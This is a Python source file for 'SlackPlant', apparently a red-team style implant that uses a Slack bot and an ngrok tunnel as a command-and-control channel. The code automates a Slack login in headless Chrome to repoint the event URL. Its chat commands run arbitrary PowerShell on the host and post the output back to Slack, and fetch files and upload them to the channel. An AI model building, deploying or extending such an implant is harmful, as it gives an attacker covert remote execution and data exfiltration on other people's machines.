import os
import re
import requests
import subprocess
import threading

from pyngrok import ngrok
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from slack_bolt import App
from time import sleep

class SlackPlant:
    
    ps_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    help = \
    '''!help        Get this message
    !test        Test communication with implant
    !command     Run a PowerShell command. Takes parameters and runs as subprocess
    !download    Downloads a given link and uploads to Slack
    !upload     Uploads a file to implant location'''
    
    app = App(
            token=os.environ.get("SLACK_BOT_TOKEN"),
            signing_secret=os.environ.get("SLACK_SIGNING_SECRET")
    )
    
    def __init__(self, slack_workspace=None, slack_user=None, slack_pass=None, slack_app=None,
        ngrok_token=None, port=None):
        if slack_workspace:
            self.slack_workspace = slack_workspace
        else:
            self.slack_workspace = os.environ.get("SLACKBOT_WORKSPACE")
        if slack_user:
            self.slack_user = slack_user
        else:
            self.slack_user = os.environ.get("SLACKBOT_USER")
        if slack_pass:
            self.slack_pass = slack_pass
        else:
            self.slack_pass = os.environ.get("SLACKBOT_PASS")
        if slack_app:
            self.slack_app = slack_app
        else:
            self.slack_app = os.environ.get("SLACKBOT_APP")
        self.ngrok_token = ngrok_token
        if port:
            self.port = port
        else:
            self.port = int(os.environ.get("PORT", 3000))
        self.tunnel_url,self.tunnel = self.open_ngrok_tunnel()
        
    def start(self):
        update = threading.Thread(target=self.update_slack_events_url)
        update.start()
        self.app.start(port=self.port)
    
    def open_ngrok_tunnel(self):
        # Opens ngrok tunnel
        ngrok.set_auth_token(self.ngrok_token)
        http_tunnel = ngrok.connect(self.port, "http")
        tunnel_url = http_tunnel.public_url[:4] + 's' + http_tunnel.public_url[4:]
        return tunnel_url,http_tunnel
        
    def update_slack_events_url(self):
        # Update slack api callback
        
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        driver = webdriver.Chrome('chromedriver.exe',options=chrome_options)
        #driver = webdriver.PhantomJS('./phantomjs.exe')

        slack_url = self.slack_app
        signin_link = 'https://slack.com/workspace-signin'

        driver.get(signin_link)
        workspace_textbox = '//*[@id="domain"]'
        driver.find_element_by_xpath(workspace_textbox).send_keys(self.slack_workspace)
        continue_button = '//*[@id="page_contents"]/div/div/div[1]/div[2]/form/button'
        con = driver.find_element_by_xpath(continue_button).click()
        sleep(1)
        email_textbox = '//*[@id="email"]'
        driver.find_element_by_xpath(email_textbox).send_keys(self.slack_user)
        password_textbox = '//*[@id="password"]'
        driver.find_element_by_xpath(password_textbox).send_keys(self.slack_pass)
        signin_button = '//*[@id="signin_btn"]'
        driver.find_element_by_xpath(signin_button).click()
        sleep(1)
        driver.back()
        driver.back()
        driver.back()
        driver.back()
        driver.back()

        driver.get(slack_url+'/event-subscriptions?')
        events_link = '//*[@id="api_nav"]/div[1]/ul[2]/li[8]/a'
        change_button = '//*[@id="change_request_url"]'
        url_textbox = '//*[@id="request_url"]'
        save_button = '/html/body/div[3]/div/div/button[2]'
        #driver.find_element_by_xpath(events_link).click()
        sleep(1)
        driver.find_element_by_xpath(change_button).click()
        sleep(1)
        driver.find_element_by_xpath(url_textbox).send_keys(f'{self.tunnel_url}/slack/events')
        sleep(5)
        driver.find_element_by_xpath(save_button).click()
        sleep(1)
        driver.close()
    
    @app.message("!help")
    def message_help(message, say):
        say(f'{help}')

    @app.message("!test")
    def message_test(message, say):
        say('Good test')

    @app.message("!command")
    def message_command(message, say):
        cmd = (' '.join(message['text'].split(' ')[1:]))
        res = subprocess.check_output(f'{ps_path} {cmd}', shell=True).decode('utf-8')
        say(f"```{res}```")
        
    @app.message("!download")
    def message_download(message, say):
        channel_id = message["channel"]
        
        # TODO: Add ability to 'download' a file from local computer
        link = re.split(' |\xa0',message['text'])[1].replace('>','').replace('<','')
        filename = (link.split('/')[-1]).replace('>','')
        cmd = f'{ps_path} Invoke-webRequest -Uri {link} -Outfile "H:\\slackbot\\downloads\\{filename}"'
        say(f"Downloading `{filename}`...")
        #subprocess.call(f'{cmd}', shell=True)
        #f={'file':(f'downloads/{filename}', open(f'downloads/{filename}', 'rb'), (filename.split('.')[-1]))}
        
        res = requests.get(link, allow_redirects=True, stream=True)
        
        app.client.files_upload(
            channels=channel_id,
            filename=filename,
            content=res.content,
        )
        
        res = ''

# Start your app
if __name__ == "__main__":
    implant = SlackPlant(ngrok_token=os.environ.get("NGROK_AUTH_TOKEN"))
    implant.start()
